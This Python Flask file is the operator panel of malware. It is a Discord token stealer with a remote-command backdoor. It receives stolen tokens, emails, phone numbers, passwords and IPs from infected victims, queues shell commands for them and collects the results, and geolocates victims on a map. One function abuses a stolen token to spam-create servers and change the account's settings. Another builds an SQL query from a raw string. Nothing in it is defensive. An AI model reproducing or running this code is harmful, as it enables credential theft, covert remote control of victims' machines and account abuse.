# -*- coding: UTF-8 -*-
import base64
import flask
import json
import string
import hashlib
from werkzeug.utils import secure_filename
from jinja2 import utils
from flask import (
    Flask,
    g,
    redirect,
    render_template,
    request,
    session,
    url_for,
    jsonify
)
from itertools import cycle
import time
import random
import configparser
from json import loads, dumps
from requests import patch, Session, get
import sqlite3
app = flask.Flask(__name__)
app.config["DEBUG"] = False
connection = sqlite3.connect("db.db",check_same_thread=False,timeout=20)
db = connection.cursor()


class User:
    def __init__(self, id, username, password):
        self.id = id
        self.username = username
        self.password = password

    def __repr__(self):
        return f'<User: {self.username}>'


def randomstr():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k = 9))


config = configparser.ConfigParser()
config.read('usuarios.ini')
users = []
users.append(User(id=1, username=config["CUENTA"]["usuario"], password=config["CUENTA"]["passwd"]))
N = 9
app.config['SECRET_KEY'] = randomstr()
app.config['UPLOAD_FOLDER'] = "\\pip\\"
"""@app.route('/subirarchivo', methods = ['GET', 'POST'])
def upload_file():
    try:
        if request.method == 'POST':
            f = request.files['file']
            f.save(app.config['UPLOAD_FOLDER']+request.args['nombre'])
    except:
        return dumps({"upload": "error"})
    return dumps({"upload": "ok"})"""


def maxsesiones(nombre):
    execute = "SELECT nombre FROM sesionesbackdoor WHERE nombre=?"
    db.execute(execute, (nombre,))
    return len(db.fetchall())


def ultimalinea(f):
    f = f.replace("&gt;", ":");
    return [i for i in f.split('<br>') if i][-1]


def borrarlogs(nombre):
    execute = "DELETE FROM sesionesbackdoor WHERE nombre=?"
    db.execute(execute, (nombre,))
    execute = "DELETE FROM backdoor WHERE nombre=?"
    db.execute(execute, (nombre,))
    connection.commit()


@app.route('/backdoor', methods=['GET'])
def backdoor():
    if 'api' in request.args:
        try:
            execute = "SELECT identificador from sesionesbackdoor WHERE sesion=?"
            db.execute(execute, (request.args['sesion'],))
            identificador = db.fetchall()[0][0]
            db.execute("SELECT comando from backdoor WHERE identificador=? AND estado='completado'", (identificador,))
            comander = db.fetchall()
            return str(utils.escape(comander[0][0].decode('utf-8'))).replace("\n", "<br>")
        except:
            return "Procesando"
    if not g.user:
        return redirect(url_for('login'))
    identificador = hashlib.md5(randomstr().encode("utf-8")).hexdigest()
    nombre = request.args['nombre']
    if 'actualizarsesion' in request.args:
        sesion = request.args['sesion']
        comando = request.args['comando']
        execute = '''INSERT INTO backdoor (nombre, comando, identificador, estado) VALUES (?, ?, ?, "procesando");'''
        db.execute(execute, (nombre,comando,identificador,))
        execute = '''UPDATE sesionesbackdoor SET identificador=? WHERE sesion=?;'''
        db.execute(execute, (identificador,sesion,))
        connection.commit()
        return "asd"
    if 'subirsesion' in request.args:
        if maxsesiones(nombre) < int(config["APLICACION"]["max_sessiones_backdoor"]):
            execute = '''INSERT INTO backdoor (nombre, comando, identificador, estado) VALUES (?, "whoami", ?, "procesando");'''
            db.execute(execute, (nombre, identificador,))
            execute = '''INSERT INTO sesionesbackdoor (sesion, identificador, nombre) VALUES (?, ?, ?);'''
            db.execute(execute, (hashlib.md5(randomstr().encode("utf-8")).hexdigest(),identificador, request.args['nombre'],))
            connection.commit()
            return dumps({"estado": "ok"})
        return dumps({"estado": "error"})
    return render_template("backdoor.html")


#estructura csv={[token][nitro][usuario][email][telefono][distinguidor]} delimitador=?
def checkuser(usuario):
    execute = "SELECT usuario from stealer WHERE usuario=?"
    db.execute(execute, (usuario,))
    resultado = db.fetchall()
    return resultado


def marear(_token, segundos):
    locales = [
        "da", "de",
        "en-GB", "en-US",
        "es-ES", "fr",
        "hr", "it",
        "lt", "hu",
        "nl", "no",
        "pl", "pt-BR",
        "ro", "fi",
        "sv-SE", "vi",
        "tr", "cs",
        "el", "bg",
        "ru", "uk",
        "th", "zh-CN",
        "ja", "zh-TW",
        "ko"
    ]
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "a",
        'region': "europe"
    }
    while True:
        try:
            modes = cycle(["light", "dark"])
            N = 8
            for lk in range(0, 50):
                guild["name"] = ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))
                post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
                time.sleep(0.35)
            segundos = segundos*2
            for pi in range(0, segundos):
                payload["theme"] = next(modes)
                payload["locale"] = random.choice(locales)
                payload["status"] = random.choice(["online", "idle", "dnd", "invisible"])
                patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload, timeout=8)
                time.sleep(1)
        except Exception as pn:
            print(pn)
        else:
            break
    return f"CREANDO 50 SERVIDORES Y CAMBIANDO TEMA DURANTE {segundos/2} SEGUNDOS"


@app.before_request
def before_request():
    g.user = None
    if 'user_id' in session:
        user = [x for x in users if x.id == session['user_id']][0]
        print(user)
        g.user = user

@app.route('/api/cargar', methods=['POST'])
def cargar():
    try:
        b64 = loads(base64.b64decode(request.form['json']))
        a = "UPDATE backdoor SET comando=?, estado=? WHERE nombre=? AND identificador=?"
        print(b64)
        db.execute(a, (base64.b64decode(b64['resultado']),'completado',b64["nombre"],b64["identificador"],))
        connection.commit()
        return dumps({"estado": "ok"})
    except:
        print('error')
        return dumps({"estado": "error"})
@app.route('/api/cola', methods=['POST'])
def cola():
    try:
        b64 = loads(base64.b64decode(request.form['json']).decode("utf-8", "ignore"))
        a = "SELECT comando, identificador FROM backdoor WHERE nombre=? AND estado=?"
        db.execute(a, (b64['nombre'], 'procesando',))
        resultado = db.fetchall()[0]
        return dumps({"comando": resultado[0], "identificador": resultado[1]})
    except:
        return dumps({"estado": "error"})
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        session.pop('user_id', None)

        username = request.form['username']
        password = request.form['password']

        user = [x for x in users if x.username == username][0]
        if user and user.password == password:
            session['user_id'] = user.id
            return redirect(url_for('principal'))

        return redirect(url_for('login'))

    return render_template('login.html')


#estructura csv={[token][nitro][usuario][email][telefono][infectador]} delimitador=?
def insertuserdata(array, ip):
    """insertar datos de victima desde la api a la bd"""
    a = '''INSERT INTO stealer (id, token, nitro, usuario, email, telefono, passwd, ip) VALUES (5, ?, ?, ?, ?, ?, ?, ?);'''
    db.execute(a, (array["token"],array["nitro"],array["usuario"],array["email"],array["telefono"],array["passwd"], ip))
    connection.commit()


def parseapi(b64):
    b64 = base64.b64decode(b64.encode('utf-8'))
    b64 = b64.decode("utf-8")
    b64 = json.loads(b64)
    return b64


@app.errorhandler(500)
def pagina_no_encontrada(e):
    return render_template('error.html')


def retuserdata(usuario):
    """Recoger datos de una victima almacenada en la bd"""
    a = f"SELECT token, nitro, usuario, email, telefono, passwd, ip FROM stealer WHERE usuario='{usuario}'"
    db.execute(a)
    array = db.fetchall()
    return array


def retallusers():
    try:
        a = "SELECT usuario FROM stealer"
        db.execute(a)
        array = db.fetchall()
        return array
    except:
        return [('error'), ('error')]


def retusuario(usuario):
    try:
        execute = "SELECT usuario FROM stealer WHERE usuario=?"
        db.execute(execute, (usuario,))
    except:
        return [('error'), ('error')]
    return db.fetchall()


@app.route('/')
def redirecionarmain():
    return redirect(url_for('principal'))

@app.route('/principal', methods=['GET'])
def principal():
    try:
        if not g.user:
            return redirect(url_for('login'))
        estado = ''
        if 'busqueda' in request.args:
            arra = retusuario(request.args['busqueda'])
            psad = arra[0][0]
        else:
            arra = retallusers()
    except Exception as f:
        estado = '<br><div class="alert alert-danger" role="alert">Usuario no encontrado</div>'
    ee = []
    for b in arra:
        ee.append(b[0])
    return render_template('principal.html', arra2=ee, flask=flask, estado=estado)


"""@app.route('/crazytoken/', methods=['GET'])
def crazytoken():
    if not g.user:
        return redirect(url_for('login'))
    if 'victima' in request.args:
        perfil = request.args['pf']
        perfil = retuserdata(perfil)
        tokenfuck(perfil[0], 20)"""

def getsesiones(nombre):
    execute = "SELECT sesion from sesionesbackdoor WHERE nombre=?"
    db.execute(execute, (nombre,))
    return db.fetchall()

@app.route('/victima/', methods=['GET'])
def victima():
    if not g.user:
        return redirect(url_for('login'))
    if 'pf' in request.args:
        perfil = request.args['pf']
        if len(perfil) <=0: return "Si has introducido la url manualmente, revisala. (Usuario no encontrado)";
        perfil = retuserdata(perfil)
        perfil = perfil[0]
        if 'passwd' in request.args:
            return perfil[5]
        if 'geo' in request.args:
            asd = get("http://ip-api.com/json/" + perfil[6])
            asd = asd.text
            rutas = loads(asd)
            return redirect("https://www.google.com/maps/search/?api=1&query="+str(rutas["lat"])+" "+str(rutas["lon"]))
        if 'sesion' in request.args:
            contenido = get("http://" + request.host + "/backdoor?api&sesion=" + request.args['sesion']).text
            ruta = ultimalinea(contenido)
        else:
            ruta = "[Sesion no creada]"
            contenido = "[Sesion no creada]"
        if 'borrarlogs' in request.args:
            borrarlogs(request.args['pf'])
            return redirect(url_for('principal'))
        sesiones = getsesiones(request.args['pf'])
        return render_template("victima.html", bas=perfil, username=request.args['pf'], ruta=ruta, contenido=contenido, sessions=sesiones)


@app.route('/api/', methods=['GET'])
def api():
    if config["APLICACION"]["backdoor"] != "enabled":
        return dumps({"auth": "Disabled"})
    if 'b' in request.args:
        base64 = request.args['b']
        base64 = parseapi(base64)
        if not len(checkuser(base64["usuario"]))<=0:
            return json.dumps({"estado": "error"})
        else:
            insertuserdata(base64, request.remote_addr)
            return json.dumps({"estado": "correcto"})
    else:
        return dumps({"auth": "False"})
print("[INFO] iniciando THREAD WEB en el puerto "+config["APLICACION"]["puerto"])
app.run(port=int(config["APLICACION"]["puerto"]), host=config["APLICACION"]["servidor"], debug=False)